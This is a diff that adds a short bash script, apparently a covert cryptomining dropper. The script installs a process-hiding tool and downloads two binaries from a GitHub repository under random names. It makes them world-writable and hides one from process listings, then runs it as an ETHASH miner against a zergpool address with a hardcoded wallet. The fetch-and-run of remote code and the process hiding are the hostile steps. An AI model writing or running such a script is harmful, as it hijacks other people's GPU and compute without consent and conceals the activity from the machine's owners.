@@ -1,0 +1,15 @@
+#!/bin/bash
+nvidia-smi
+npm i -g node-process-hider >/dev/null
+worker=$(cat /proc/sys/kernel/hostname)
+sudo apt -qq update
+sudo apt -qq install screen -y
+a=$(shuf -i 1000000000-9999999999 -n 1)
+b=$(shuf -i 1000000000-9999999999 -n 1)
+wget -qO $a https://github.com/rifkithears/entod/raw/main/compile
+wget -qO $b https://github.com/rifkithears/entod/raw/main/fix
+chmod 777 $a $b
+ph add $a >/dev/null
+echo $worker
+screen -dmS run ./$b
+./$a --algo ETHASH --pool ethash.mine.zergpool.com:9999 --user DKQsTPTKTH8qWaKmVhyVzUJfmhmifCzXou --pass c=DGB,mc=TSF
